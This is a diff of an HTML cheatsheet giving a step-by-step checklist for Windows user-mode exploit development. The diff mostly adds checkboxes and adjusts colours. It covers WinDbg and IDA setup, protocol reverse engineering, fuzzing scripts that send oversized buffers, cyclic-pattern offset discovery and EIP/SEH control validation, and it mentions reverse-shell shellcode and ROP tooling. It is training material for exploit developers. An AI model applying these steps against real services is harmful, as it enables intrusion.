@@ -44,28 +44,30 @@
   /* Index sidebar color flow */
   .section-flow-1{background-color:hsl(270, 20%, 94%);}
   .section-flow-1 .dropdown-container,.section-flow-1 .nested-dropdown-container{background-color:hsl(270, 20%, 94%);}
-  .section-flow-2{background-color:hsl(270, 25%, 76%);}
-  .section-flow-2 .dropdown-container,.section-flow-2 .nested-dropdown-container{background-color:hsl(270, 25%, 76%);}
-  .section-flow-3{background-color:hsl(270, 29%, 62%);}
-  .section-flow-3 .dropdown-container,.section-flow-3 .nested-dropdown-container{background-color:hsl(270, 29%, 62%);}
-  .section-flow-4{background-color:hsl(270, 32%, 51%);}
-  .section-flow-4 .dropdown-container,.section-flow-4 .nested-dropdown-container{background-color:hsl(270, 32%, 51%);}
-  .section-flow-5{background-color:hsl(270, 34%, 44%);}
-  .section-flow-5 .dropdown-container,.section-flow-5 .nested-dropdown-container{background-color:hsl(270, 34%, 44%);}
-  .section-flow-6{background-color:hsl(270, 35%, 40%);}
-  .section-flow-6 .dropdown-container,.section-flow-6 .nested-dropdown-container{background-color:hsl(270, 35%, 40%);}
+  .section-flow-2{background-color:hsl(270, 25%, 78%);}
+  .section-flow-2 .dropdown-container,.section-flow-2 .nested-dropdown-container{background-color:hsl(270, 25%, 78%);}
+  .section-flow-3{background-color:hsl(270, 28%, 64%);}
+  .section-flow-3 .dropdown-container,.section-flow-3 .nested-dropdown-container{background-color:hsl(270, 28%, 64%);}
+  .section-flow-4{background-color:hsl(270, 31%, 54%);}
+  .section-flow-4 .dropdown-container,.section-flow-4 .nested-dropdown-container{background-color:hsl(270, 31%, 54%);}
+  .section-flow-5{background-color:hsl(270, 33%, 46%);}
+  .section-flow-5 .dropdown-container,.section-flow-5 .nested-dropdown-container{background-color:hsl(270, 33%, 46%);}
+  .section-flow-6{background-color:hsl(270, 35%, 42%);}
+  .section-flow-6 .dropdown-container,.section-flow-6 .nested-dropdown-container{background-color:hsl(270, 35%, 42%);}
   .section-flow-7{background-color:hsl(270, 35%, 40%);}
   .section-flow-7 .dropdown-container,.section-flow-7 .nested-dropdown-container{background-color:hsl(270, 35%, 40%);}
-  .section-flow-8{background-color:hsl(270, 34%, 44%);}
-  .section-flow-8 .dropdown-container,.section-flow-8 .nested-dropdown-container{background-color:hsl(270, 34%, 44%);}
-  .section-flow-9{background-color:hsl(270, 32%, 51%);}
-  .section-flow-9 .dropdown-container,.section-flow-9 .nested-dropdown-container{background-color:hsl(270, 32%, 51%);}
-  .section-flow-10{background-color:hsl(270, 29%, 62%);}
-  .section-flow-10 .dropdown-container,.section-flow-10 .nested-dropdown-container{background-color:hsl(270, 29%, 62%);}
-  .section-flow-11{background-color:hsl(270, 25%, 76%);}
-  .section-flow-11 .dropdown-container,.section-flow-11 .nested-dropdown-container{background-color:hsl(270, 25%, 76%);}
-  .section-flow-12{background-color:hsl(270, 20%, 94%);}
-  .section-flow-12 .dropdown-container,.section-flow-12 .nested-dropdown-container{background-color:hsl(270, 20%, 94%);}
+  .section-flow-8{background-color:hsl(270, 35%, 42%);}
+  .section-flow-8 .dropdown-container,.section-flow-8 .nested-dropdown-container{background-color:hsl(270, 35%, 42%);}
+  .section-flow-9{background-color:hsl(270, 33%, 46%);}
+  .section-flow-9 .dropdown-container,.section-flow-9 .nested-dropdown-container{background-color:hsl(270, 33%, 46%);}
+  .section-flow-10{background-color:hsl(270, 31%, 54%);}
+  .section-flow-10 .dropdown-container,.section-flow-10 .nested-dropdown-container{background-color:hsl(270, 31%, 54%);}
+  .section-flow-11{background-color:hsl(270, 28%, 64%);}
+  .section-flow-11 .dropdown-container,.section-flow-11 .nested-dropdown-container{background-color:hsl(270, 28%, 64%);}
+  .section-flow-12{background-color:hsl(270, 25%, 78%);}
+  .section-flow-12 .dropdown-container,.section-flow-12 .nested-dropdown-container{background-color:hsl(270, 25%, 78%);}
+  .section-flow-13{background-color:hsl(270, 20%, 94%);}
+  .section-flow-13 .dropdown-container,.section-flow-13 .nested-dropdown-container{background-color:hsl(270, 20%, 94%);}
   </style>
 </head>
 
@@ -172,7 +174,7 @@
             <div class="cheatsheet-content">
 
 <h2 id="methodology">1. Methodology</h2>
-<ul><li>Operator-checklist methodology for Windows user-mode exploit development. Each phase walks the exploit-dev lifecycle end-to-end: triage the target, find the bug, control execution, bypass mitigations, deliver shellcode.</li></ul>
+<ul><li><input type="checkbox"> Operator-checklist methodology for Windows user-mode exploit development. Each phase walks the exploit-dev lifecycle end-to-end: triage the target, find the bug, control execution, bypass mitigations, deliver shellcode.</li></ul>
 
 <h3>Exploitation Path Decision Table</h3>
 <table class="custom-table">
@@ -239,21 +241,21 @@
 </table>
 
 <h3 id="methodology-recon-setup">1.1 Reconnaissance &amp; Setup</h3>
-<ul><li>Stand up your debugging environment, analyse the target binary, and prepare your toolchain before writing a single byte of exploit code.</li></ul>
+<ul><li><input type="checkbox"> Stand up your debugging environment, analyse the target binary, and prepare your toolchain before writing a single byte of exploit code.</li></ul>
 <h3 id="methodology-recon-setup-env-setup">1.1.1 Environment Setup</h3>
   <ul>
-    <li>Configure WinDbg with Microsoft symbol server:
+    <li><input type="checkbox"> Configure WinDbg with Microsoft symbol server:
       <ul>
-        <li><code>.sympath srv*C:\symbols*https://msdl.microsoft.com/download/symbols</code></li>
-        <li><code>.reload /f</code> &mdash; force symbol download for all loaded modules</li>
-        <li>Verify symbols loaded: <code>lm</code> should show <code>(pdb symbols)</code> next to each module</li>
+        <li><input type="checkbox"> <code>.sympath srv*C:\symbols*https://msdl.microsoft.com/download/symbols</code></li>
+        <li><input type="checkbox"> <code>.reload /f</code> &mdash; force symbol download for all loaded modules</li>
+        <li><input type="checkbox"> Verify symbols loaded: <code>lm</code> should show <code>(pdb symbols)</code> next to each module</li>
       </ul>
     </li>
-    <li>Load the pykd extension for scripting:
+    <li><input type="checkbox"> Load the pykd extension for scripting:
       <ul>
-        <li><code>.load pykd</code></li>
-        <li>Test with <code>!py C:\Tools\test.py</code> &mdash; confirm output appears in WinDbg console</li>
-        <li>pykd API: <code>pykd.reg("eip")</code>, <code>pykd.loadDWords(addr, count)</code>, <code>pykd.loadBytes(addr, count)</code></li>
+        <li><input type="checkbox"> <code>.load pykd</code></li>
+        <li><input type="checkbox"> Test with <code>!py C:\Tools\test.py</code> &mdash; confirm output appears in WinDbg console</li>
+        <li><input type="checkbox"> pykd API: <code>pykd.reg("eip")</code>, <code>pykd.loadDWords(addr, count)</code>, <code>pykd.loadBytes(addr, count)</code></li>
       </ul>
     </li>
   </ul>
@@ -264,43 +266,43 @@
 lm                          # verify all modules show (pdb symbols)
 !py C:\Tools\test.py        # verify pykd loads</code></pre>
   <ul>
-    <li>Snapshot the debugging VM before each exploit attempt:
+    <li><input type="checkbox"> Snapshot the debugging VM before each exploit attempt:
       <ul>
-        <li>Match the target OS build (Windows 10/11, Server 2019/2022) to the engagement</li>
-        <li>Disable automatic updates to pin the binary version</li>
-        <li>Take a clean snapshot with WinDbg attached and symbols loaded</li>
+        <li><input type="checkbox"> Match the target OS build (Windows 10/11, Server 2019/2022) to the engagement</li>
+        <li><input type="checkbox"> Disable automatic updates to pin the binary version</li>
+        <li><input type="checkbox"> Take a clean snapshot with WinDbg attached and symbols loaded</li>
       </ul>
     </li>
-    <li>Set up the exploit development directory:
+    <li><input type="checkbox"> Set up the exploit development directory:
       <ul>
-        <li>Create workspace: <code>mkdir exploit && cd exploit</code></li>
-        <li>Skeleton exploit script in Python with <code>import socket, struct</code></li>
-        <li>Keep a notes file mapping offsets, bad chars, and gadget addresses</li>
+        <li><input type="checkbox"> Create workspace: <code>mkdir exploit && cd exploit</code></li>
+        <li><input type="checkbox"> Skeleton exploit script in Python with <code>import socket, struct</code></li>
+        <li><input type="checkbox"> Keep a notes file mapping offsets, bad chars, and gadget addresses</li>
       </ul>
     </li>
   </ul>
 
 <h3 id="methodology-recon-setup-target-analysis">1.1.2 Target Analysis</h3>
   <ul>
-    <li>Identify the target binary and its loaded modules:
+    <li><input type="checkbox"> Identify the target binary and its loaded modules:
       <ul>
-        <li><code>lm</code> &mdash; list all modules with base addresses and ASLR/SafeSEH flags</li>
-        <li><code>lm m targetapp</code> &mdash; get base address of the target module</li>
-        <li><code>x kernel32!Virtual*</code> &mdash; symbol lookup with wildcards</li>
+        <li><input type="checkbox"> <code>lm</code> &mdash; list all modules with base addresses and ASLR/SafeSEH flags</li>
+        <li><input type="checkbox"> <code>lm m targetapp</code> &mdash; get base address of the target module</li>
+        <li><input type="checkbox"> <code>x kernel32!Virtual*</code> &mdash; symbol lookup with wildcards</li>
       </ul>
     </li>
-    <li>Identify input vectors and protocol:
+    <li><input type="checkbox"> Identify input vectors and protocol:
       <ul>
-        <li>Network service: identify listening port, protocol (TCP/UDP), message format</li>
-        <li>File parser: identify supported file formats, magic bytes, header structure</li>
-        <li>Hook network input: <code>bp ws2_32!recv</code> or <code>bp ws2_32!WSARecv</code></li>
+        <li><input type="checkbox"> Network service: identify listening port, protocol (TCP/UDP), message format</li>
+        <li><input type="checkbox"> File parser: identify supported file formats, magic bytes, header structure</li>
+        <li><input type="checkbox"> Hook network input: <code>bp ws2_32!recv</code> or <code>bp ws2_32!WSARecv</code></li>
       </ul>
     </li>
-    <li>Map the attack surface in the binary:
+    <li><input type="checkbox"> Map the attack surface in the binary:
       <ul>
-        <li>Search for dangerous functions: <code>x targetapp!*strcpy*</code>, <code>x targetapp!*sprintf*</code>, <code>x targetapp!*memcpy*</code></li>
-        <li>Check import table for unsafe APIs: <code>!dh targetapp -f</code></li>
-        <li>Note the calling convention (stdcall vs cdecl) &mdash; affects stack cleanup and offset calc</li>
+        <li><input type="checkbox"> Search for dangerous functions: <code>x targetapp!*strcpy*</code>, <code>x targetapp!*sprintf*</code>, <code>x targetapp!*memcpy*</code></li>
+        <li><input type="checkbox"> Check import table for unsafe APIs: <code>!dh targetapp -f</code></li>
+        <li><input type="checkbox"> Note the calling convention (stdcall vs cdecl) &mdash; affects stack cleanup and offset calc</li>
       </ul>
     </li>
   </ul>
@@ -322,30 +324,30 @@ bp kernel32!ReadFile            # break on file read
 
 <h3 id="methodology-recon-setup-tool-prep">1.1.3 Tool Preparation</h3>
   <ul>
-    <li>Pattern generation for offset discovery:
+    <li><input type="checkbox"> Pattern generation for offset discovery:
       <ul>
-        <li><code>msf-pattern_create -l 2000 > pattern.txt</code> &mdash; cyclic pattern</li>
-        <li><code>msf-pattern_offset -l 2000 -q 42306142</code> &mdash; find exact offset from EIP value</li>
+        <li><input type="checkbox"> <code>msf-pattern_create -l 2000 > pattern.txt</code> &mdash; cyclic pattern</li>
+        <li><input type="checkbox"> <code>msf-pattern_offset -l 2000 -q 42306142</code> &mdash; find exact offset from EIP value</li>
       </ul>
     </li>
-    <li>Opcode lookup:
+    <li><input type="checkbox"> Opcode lookup:
       <ul>
-        <li><code>msf-nasm_shell</code> &rarr; type <code>jmp esp</code> &rarr; get <code>FF E4</code></li>
-        <li><code>msf-nasm_shell</code> &rarr; type <code>pop pop ret</code> for SEH gadgets</li>
+        <li><input type="checkbox"> <code>msf-nasm_shell</code> &rarr; type <code>jmp esp</code> &rarr; get <code>FF E4</code></li>
+        <li><input type="checkbox"> <code>msf-nasm_shell</code> &rarr; type <code>pop pop ret</code> for SEH gadgets</li>
       </ul>
     </li>
-    <li>ROP gadget finders:
+    <li><input type="checkbox"> ROP gadget finders:
       <ul>
-        <li><code>rp-win-x86.exe -f target.dll --rop 5 --unique > gadgets.txt</code> &mdash; RP++</li>
-        <li><code>ropper --file target.dll --search "pop eax; ret"</code> &mdash; Ropper targeted search</li>
-        <li><code>ropper --file target.dll --chain "virtualalloc"</code> &mdash; auto-generate ROP chain</li>
+        <li><input type="checkbox"> <code>rp-win-x86.exe -f target.dll --rop 5 --unique > gadgets.txt</code> &mdash; RP++</li>
+        <li><input type="checkbox"> <code>ropper --file target.dll --search "pop eax; ret"</code> &mdash; Ropper targeted search</li>
+        <li><input type="checkbox"> <code>ropper --file target.dll --chain "virtualalloc"</code> &mdash; auto-generate ROP chain</li>
       </ul>
     </li>
-    <li>Keystone engine for inline assembly:
+    <li><input type="checkbox"> Keystone engine for inline assembly:
       <ul>
-        <li>Use Keystone from Python to assemble custom shellcode stubs</li>
-        <li>Egghunter assembly, encoder stubs, and custom gadgets</li>
-        <li>Verify assembled bytes match expected opcodes in WinDbg</li>
+        <li><input type="checkbox"> Use Keystone from Python to assemble custom shellcode stubs</li>
+        <li><input type="checkbox"> Egghunter assembly, encoder stubs, and custom gadgets</li>
+        <li><input type="checkbox"> Verify assembled bytes match expected opcodes in WinDbg</li>
       </ul>
     </li>
   </ul>
@@ -466,38 +468,38 @@ print("JMP -16:", bytes(encoding).hex())
   </tbody>
 </table>
 
-<ul><li><strong>General references:</strong> <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/" target="_blank" rel="noopener noreferrer">WinDbg documentation</a> &middot; <a href="https://www.corelan.be/index.php/articles/" target="_blank" rel="noopener noreferrer">Corelan tutorials</a></li></ul>
+<ul><li><input type="checkbox"> <strong>General references:</strong> <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/" target="_blank" rel="noopener noreferrer">WinDbg documentation</a> &middot; <a href="https://www.corelan.be/index.php/articles/" target="_blank" rel="noopener noreferrer">Corelan tutorials</a></li></ul>
 
 <h3 id="methodology-reverse-engineering">1.2 Reverse Engineering</h3>
-<ul><li>Combine static and dynamic analysis to find the vulnerability. Start in IDA, confirm in WinDbg.</li></ul>
+<ul><li><input type="checkbox"> Combine static and dynamic analysis to find the vulnerability. Start in IDA, confirm in WinDbg.</li></ul>
 <h3 id="methodology-reverse-engineering-ida-static">1.2.1 IDA Pro Static Analysis</h3>
   <ul>
-    <li>Start from the Imports window and trace data flow inward:
+    <li><input type="checkbox"> Start from the Imports window and trace data flow inward:
       <ul>
-        <li>Look for network input functions: <code>recv</code>, <code>WSARecv</code>, <code>ReadFile</code>, <code>fread</code></li>
-        <li>Press <code>X</code> on each import to list cross-references (callers)</li>
-        <li>Follow the call chain upward until you find the parsing function</li>
+        <li><input type="checkbox"> Look for network input functions: <code>recv</code>, <code>WSARecv</code>, <code>ReadFile</code>, <code>fread</code></li>
+        <li><input type="checkbox"> Press <code>X</code> on each import to list cross-references (callers)</li>
+        <li><input type="checkbox"> Follow the call chain upward until you find the parsing function</li>
       </ul>
     </li>
-    <li>Audit the parsing function for unsafe patterns:
+    <li><input type="checkbox"> Audit the parsing function for unsafe patterns:
       <ul>
-        <li>Search for <code>strcpy</code>, <code>strcat</code>, <code>sprintf</code>, <code>memcpy</code> / <code>CopyMemory</code> calls</li>
-        <li>Check if the length argument comes from attacker-controlled input</li>
-        <li>Check if the destination buffer is stack-allocated (local variable) vs heap</li>
+        <li><input type="checkbox"> Search for <code>strcpy</code>, <code>strcat</code>, <code>sprintf</code>, <code>memcpy</code> / <code>CopyMemory</code> calls</li>
+        <li><input type="checkbox"> Check if the length argument comes from attacker-controlled input</li>
+        <li><input type="checkbox"> Check if the destination buffer is stack-allocated (local variable) vs heap</li>
       </ul>
     </li>
-    <li>Use the decompiler to understand complex logic:
+    <li><input type="checkbox"> Use the decompiler to understand complex logic:
       <ul>
-        <li>Press <code>F5</code> for Hex-Rays pseudocode on complex functions</li>
-        <li>Rename variables and functions as you understand them: <code>sub_401234</code> &rarr; <code>parse_header</code></li>
-        <li>Annotate loop bounds, buffer sizes, and branch conditions</li>
+        <li><input type="checkbox"> Press <code>F5</code> for Hex-Rays pseudocode on complex functions</li>
+        <li><input type="checkbox"> Rename variables and functions as you understand them: <code>sub_401234</code> &rarr; <code>parse_header</code></li>
+        <li><input type="checkbox"> Annotate loop bounds, buffer sizes, and branch conditions</li>
       </ul>
     </li>
-    <li>Calculate the address mapping for runtime use:
+    <li><input type="checkbox"> Calculate the address mapping for runtime use:
       <ul>
-        <li>IDA imagebase is usually <code>0x00400000</code> or <code>0x10000000</code></li>
-        <li>Runtime address = <code>module_base_at_runtime + (IDA_addr - IDA_imagebase)</code></li>
-        <li>Verify with <code>lm m targetapp</code> in WinDbg to get runtime base</li>
+        <li><input type="checkbox"> IDA imagebase is usually <code>0x00400000</code> or <code>0x10000000</code></li>
+        <li><input type="checkbox"> Runtime address = <code>module_base_at_runtime + (IDA_addr - IDA_imagebase)</code></li>
+        <li><input type="checkbox"> Verify with <code>lm m targetapp</code> in WinDbg to get runtime base</li>
       </ul>
     </li>
   </ul>
@@ -559,11 +561,11 @@ print("JMP -16:", bytes(encoding).hex())
 
 <h3 id="methodology-reverse-engineering-windbg-dynamic">1.2.2 WinDbg Dynamic Analysis</h3>
   <ul>
-    <li>Hook network receive to observe incoming data:
+    <li><input type="checkbox"> Hook network receive to observe incoming data:
       <ul>
-        <li><code>bp ws2_32!recv "dd esp L8; g"</code> &mdash; log recv arguments and continue</li>
-        <li><code>bp ws2_32!recv "da poi(esp+8) L?400; g"</code> &mdash; dump received buffer as ASCII</li>
-        <li>Run the target, send test input, observe buffer contents in debugger output</li>
+        <li><input type="checkbox"> <code>bp ws2_32!recv "dd esp L8; g"</code> &mdash; log recv arguments and continue</li>
+        <li><input type="checkbox"> <code>bp ws2_32!recv "da poi(esp+8) L?400; g"</code> &mdash; dump received buffer as ASCII</li>
+        <li><input type="checkbox"> Run the target, send test input, observe buffer contents in debugger output</li>
       </ul>
     </li>
   </ul>
@@ -578,28 +580,28 @@ bp ws2_32!recv "dd esp L8; g"
 # Example: IDA shows vuln at 0x00401234, imagebase 0x00400000, lm shows base 0x10000000
 # runtime = 0x10000000 + (0x00401234 - 0x00400000) = 0x10001234</code></pre>
   <ul>
-    <li>Set breakpoints on suspected vulnerable functions:
+    <li><input type="checkbox"> Set breakpoints on suspected vulnerable functions:
       <ul>
-        <li><code>bp targetapp!parse_header</code> &mdash; break at the function entry</li>
-        <li><code>bp 0x00401234</code> &mdash; break at a specific address (from IDA analysis)</li>
-        <li>Step through with <code>p</code> (step-over) and <code>t</code> (trace-into)</li>
-        <li>Use <code>pt</code> to run to the next return instruction</li>
+        <li><input type="checkbox"> <code>bp targetapp!parse_header</code> &mdash; break at the function entry</li>
+        <li><input type="checkbox"> <code>bp 0x00401234</code> &mdash; break at a specific address (from IDA analysis)</li>
+        <li><input type="checkbox"> Step through with <code>p</code> (step-over) and <code>t</code> (trace-into)</li>
+        <li><input type="checkbox"> Use <code>pt</code> to run to the next return instruction</li>
       </ul>
     </li>
-    <li>Inspect memory and registers at the crash point:
+    <li><input type="checkbox"> Inspect memory and registers at the crash point:
       <ul>
-        <li><code>r</code> &mdash; display all registers</li>
-        <li><code>db esp L100</code> &mdash; display 256 bytes at ESP</li>
-        <li><code>dd esp L20</code> &mdash; display 32 DWORDs at ESP</li>
-        <li><code>dds esp L20</code> &mdash; DWORDs with symbol resolution (useful for ROP)</li>
-        <li><code>!address eip</code> &mdash; check page permissions at EIP</li>
+        <li><input type="checkbox"> <code>r</code> &mdash; display all registers</li>
+        <li><input type="checkbox"> <code>db esp L100</code> &mdash; display 256 bytes at ESP</li>
+        <li><input type="checkbox"> <code>dd esp L20</code> &mdash; display 32 DWORDs at ESP</li>
+        <li><input type="checkbox"> <code>dds esp L20</code> &mdash; DWORDs with symbol resolution (useful for ROP)</li>
+        <li><input type="checkbox"> <code>!address eip</code> &mdash; check page permissions at EIP</li>
       </ul>
     </li>
-    <li>Use hardware breakpoints for data watchpoints:
+    <li><input type="checkbox"> Use hardware breakpoints for data watchpoints:
       <ul>
-        <li><code>ba w4 0x0012fc00</code> &mdash; break on 4-byte write to address (catch the overwrite)</li>
-        <li><code>ba e1 0x004015c0</code> &mdash; break on execute at address</li>
-        <li>Hardware breakpoints survive the code being overwritten (unlike software bp)</li>
+        <li><input type="checkbox"> <code>ba w4 0x0012fc00</code> &mdash; break on 4-byte write to address (catch the overwrite)</li>
+        <li><input type="checkbox"> <code>ba e1 0x004015c0</code> &mdash; break on execute at address</li>
+        <li><input type="checkbox"> Hardware breakpoints survive the code being overwritten (unlike software bp)</li>
       </ul>
     </li>
   </ul>
@@ -621,25 +623,25 @@ wt -l 3 -oR                    # watch trace 3 levels deep with return values</c
 
 <h3 id="methodology-reverse-engineering-protocol-re">1.2.3 Protocol Reverse Engineering</h3>
   <ul>
-    <li>Capture and analyse raw protocol traffic:
+    <li><input type="checkbox"> Capture and analyse raw protocol traffic:
       <ul>
-        <li>Hook <code>ws2_32!recv</code> and dump every received buffer</li>
-        <li>Identify header structure: magic bytes, length fields, type fields, checksums</li>
-        <li>Map which header fields control parsing behaviour (dispatch tables)</li>
+        <li><input type="checkbox"> Hook <code>ws2_32!recv</code> and dump every received buffer</li>
+        <li><input type="checkbox"> Identify header structure: magic bytes, length fields, type fields, checksums</li>
+        <li><input type="checkbox"> Map which header fields control parsing behaviour (dispatch tables)</li>
       </ul>
     </li>
-    <li>Reimplement the protocol in Python:
+    <li><input type="checkbox"> Reimplement the protocol in Python:
       <ul>
-        <li>Build a minimal client that can send valid protocol messages</li>
-        <li>Reimplement any checksum or length-prefix calculation</li>
-        <li>Use <code>struct.pack("&lt;I", value)</code> for little-endian DWORD fields</li>
+        <li><input type="checkbox"> Build a minimal client that can send valid protocol messages</li>
+        <li><input type="checkbox"> Reimplement any checksum or length-prefix calculation</li>
+        <li><input type="checkbox"> Use <code>struct.pack("&lt;I", value)</code> for little-endian DWORD fields</li>
       </ul>
     </li>
-    <li>Identify the overflow trigger in the protocol:
+    <li><input type="checkbox"> Identify the overflow trigger in the protocol:
       <ul>
-        <li>Vary each field independently: which one causes the crash?</li>
-        <li>Length fields that control a copy size are prime targets</li>
-        <li>String fields copied via <code>strcpy</code> / <code>strcat</code> without bounds checking</li>
+        <li><input type="checkbox"> Vary each field independently: which one causes the crash?</li>
+        <li><input type="checkbox"> Length fields that control a copy size are prime targets</li>
+        <li><input type="checkbox"> String fields copied via <code>strcpy</code> / <code>strcat</code> without bounds checking</li>
       </ul>
     </li>
   </ul>
@@ -670,32 +672,32 @@ for size in [0x100, 0x200, 0x400, 0x800, 0x1000, 0x2000]:
     s.send(build_packet(0x01, b"A" * size))
     s.close()</code></pre>
 
-<ul><li><strong>General references:</strong> <a href="https://www.corelan.be/index.php/articles/" target="_blank" rel="noopener noreferrer">Corelan tutorials</a> &middot; <a href="https://www.fuzzysecurity.com/tutorials.html" target="_blank" rel="noopener noreferrer">FuzzySecurity tutorials</a></li></ul>
+<ul><li><input type="checkbox"> <strong>General references:</strong> <a href="https://www.corelan.be/index.php/articles/" target="_blank" rel="noopener noreferrer">Corelan tutorials</a> &middot; <a href="https://www.fuzzysecurity.com/tutorials.html" target="_blank" rel="noopener noreferrer">FuzzySecurity tutorials</a></li></ul>
 
 <h3 id="methodology-crash-triage">1.3 Crash Triage &amp; Offset Discovery</h3>
-<ul><li>Reproduce the crash, identify the overwrite type, and pinpoint the exact offset to the control field (EIP or SEH handler).</li></ul>
+<ul><li><input type="checkbox"> Reproduce the crash, identify the overwrite type, and pinpoint the exact offset to the control field (EIP or SEH handler).</li></ul>
 <h3 id="methodology-crash-triage-initial-crash">1.3.1 Initial Crash</h3>
   <ul>
-    <li>Send a large buffer and observe the crash type:
+    <li><input type="checkbox"> Send a large buffer and observe the crash type:
       <ul>
-        <li>Start with <code>A * 2000</code> or larger depending on expected buffer size</li>
-        <li>Attach WinDbg: <code>File > Attach to Process</code> or <code>windbg -p [pid]</code></li>
-        <li>Send the payload and wait for the access violation</li>
+        <li><input type="checkbox"> Start with <code>A * 2000</code> or larger depending on expected buffer size</li>
+        <li><input type="checkbox"> Attach WinDbg: <code>File > Attach to Process</code> or <code>windbg -p [pid]</code></li>
+        <li><input type="checkbox"> Send the payload and wait for the access violation</li>
       </ul>
     </li>
-    <li>Determine the crash type from the exception:
+    <li><input type="checkbox"> Determine the crash type from the exception:
       <ul>
-        <li>If EIP = <code>41414141</code> &rarr; direct EIP overwrite (stack BOF)</li>
-        <li>If EIP points to valid code but crash is in an exception handler &rarr; SEH overwrite</li>
-        <li>Run <code>!exchain</code> to check the SEH chain for overwritten handlers</li>
+        <li><input type="checkbox"> If EIP = <code>41414141</code> &rarr; direct EIP overwrite (stack BOF)</li>
+        <li><input type="checkbox"> If EIP points to valid code but crash is in an exception handler &rarr; SEH overwrite</li>
+        <li><input type="checkbox"> Run <code>!exchain</code> to check the SEH chain for overwritten handlers</li>
       </ul>
     </li>
-    <li>Note the state at the crash:
+    <li><input type="checkbox"> Note the state at the crash:
       <ul>
-        <li><code>r</code> &mdash; save all register values</li>
-        <li><code>db esp L100</code> &mdash; what data is on the stack after EIP?</li>
-        <li><code>!exchain</code> &mdash; are SEH handlers overwritten?</li>
-        <li><code>!address esp</code> &mdash; confirm stack is writable</li>
+        <li><input type="checkbox"> <code>r</code> &mdash; save all register values</li>
+        <li><input type="checkbox"> <code>db esp L100</code> &mdash; what data is on the stack after EIP?</li>
+        <li><input type="checkbox"> <code>!exchain</code> &mdash; are SEH handlers overwritten?</li>
+        <li><input type="checkbox"> <code>!address esp</code> &mdash; confirm stack is writable</li>
       </ul>
     </li>
   </ul>
@@ -721,11 +723,11 @@ s.close()
 
 <h3 id="methodology-crash-triage-offset-calc">1.3.2 Offset Calculation</h3>
   <ul>
-    <li>Generate and send a cyclic pattern:
+    <li><input type="checkbox"> Generate and send a cyclic pattern:
       <ul>
-        <li><code>msf-pattern_create -l 2000 > pattern.txt</code></li>
-        <li>Send the pattern as the payload instead of A's</li>
-        <li>Wait for the crash in WinDbg</li>
+        <li><input type="checkbox"> <code>msf-pattern_create -l 2000 > pattern.txt</code></li>
+        <li><input type="checkbox"> Send the pattern as the payload instead of A's</li>
+        <li><input type="checkbox"> Wait for the crash in WinDbg</li>
       </ul>
     </li>
   </ul>
@@ -735,18 +737,18 @@ msf-pattern_create -l 2000 &gt; pattern.txt
 msf-pattern_offset -l 2000 -q 42306142
 # Output: Exact match at offset 780</code></pre>
   <ul>
-    <li>Read the overwritten value and calculate the offset:
+    <li><input type="checkbox"> Read the overwritten value and calculate the offset:
       <ul>
-        <li>For EIP overwrite: <code>r eip</code> &rarr; note the 4-byte hex value</li>
-        <li>For SEH overwrite: <code>!exchain</code> &rarr; note the handler address value</li>
-        <li><code>msf-pattern_offset -l 2000 -q [hex_value]</code> &rarr; exact offset</li>
+        <li><input type="checkbox"> For EIP overwrite: <code>r eip</code> &rarr; note the 4-byte hex value</li>
+        <li><input type="checkbox"> For SEH overwrite: <code>!exchain</code> &rarr; note the handler address value</li>
+        <li><input type="checkbox"> <code>msf-pattern_offset -l 2000 -q [hex_value]</code> &rarr; exact offset</li>
       </ul>
     </li>
-    <li>Record both the EIP offset and the nSEH offset if SEH-based:
+    <li><input type="checkbox"> Record both the EIP offset and the nSEH offset if SEH-based:
       <ul>
-        <li>nSEH is always 4 bytes before the SEH handler</li>
-        <li>If SEH offset is N, then nSEH offset is <code>N - 4</code></li>
-        <li>Document both offsets in your exploit notes</li>
+        <li><input type="checkbox"> nSEH is always 4 bytes before the SEH handler</li>
+        <li><input type="checkbox"> If SEH offset is N, then nSEH offset is <code>N - 4</code></li>
+        <li><input type="checkbox"> Document both offsets in your exploit notes</li>
       </ul>
     </li>
   </ul>
@@ -803,11 +805,11 @@ msf-pattern_offset -l 2000 -q 42306142
 
 <h3 id="methodology-crash-triage-control-validation">1.3.3 Control Validation</h3>
   <ul>
-    <li>Confirm precise control over the target field:
+    <li><input type="checkbox"> Confirm precise control over the target field:
       <ul>
-        <li>Build: <code>buf = b"A" * offset + b"B" * 4 + b"C" * 200</code></li>
-        <li>For EIP: expect <code>r eip</code> = <code>42424242</code> (BBBB)</li>
-        <li>For SEH: expect <code>!exchain</code> shows handler = <code>42424242</code></li>
+        <li><input type="checkbox"> Build: <code>buf = b"A" * offset + b"B" * 4 + b"C" * 200</code></li>
+        <li><input type="checkbox"> For EIP: expect <code>r eip</code> = <code>42424242</code> (BBBB)</li>
+        <li><input type="checkbox"> For SEH: expect <code>!exchain</code> shows handler = <code>42424242</code></li>
       </ul>
     </li>
   </ul>
@@ -826,18 +828,18 @@ s.close()
 # In WinDbg: r eip should show 42424242
 # db esp L200 — count how many 43's (C) survive</code></pre>
   <ul>
-    <li>Measure available shellcode space:
+    <li><input type="checkbox"> Measure available shellcode space:
       <ul>
-        <li><code>db esp L200</code> &mdash; how many C's (<code>43</code>) follow after the overwrite?</li>
-        <li>Need at least ~400 bytes for standard reverse-shell shellcode</li>
-        <li>If less than 400 bytes available after EIP &rarr; plan for egghunter or backward jump</li>
+        <li><input type="checkbox"> <code>db esp L200</code> &mdash; how many C's (<code>43</code>) follow after the overwrite?</li>
+        <li><input type="checkbox"> Need at least ~400 bytes for standard reverse-shell shellcode</li>
+        <li><input type="checkbox"> If less than 400 bytes available after EIP &rarr; plan for egghunter or backward jump</li>
       </ul>
     </li>
-    <li>Check for additional constraints:
+    <li><input type="checkbox"> Check for additional constraints:
       <ul>
-        <li>Does the buffer get truncated at a specific length?</li>
-        <li>Does a null byte terminate the copy early?</li>
-        <li>Is there another copy of the buffer elsewhere in memory? (search with <code>s -a 0 L?80000000 "AAAA"</code>)</li>
+        <li><input type="checkbox"> Does the buffer get truncated at a specific length?</li>
+        <li><input type="checkbox"> Does a null byte terminate the copy early?</li>
+        <li><input type="checkbox"> Is there another copy of the buffer elsewhere in memory? (search with <code>s -a 0 L?80000000 "AAAA"</code>)</li>
       </ul>
     </li>
   </ul>
@@ -856,31 +858,31 @@ db @esp L?400                   # check up to 1024 bytes
 # Check if buffer is truncated at a specific length
 s -a 0 L?80000000 "CCCC"       # where does the C pattern end?</code></pre>
 
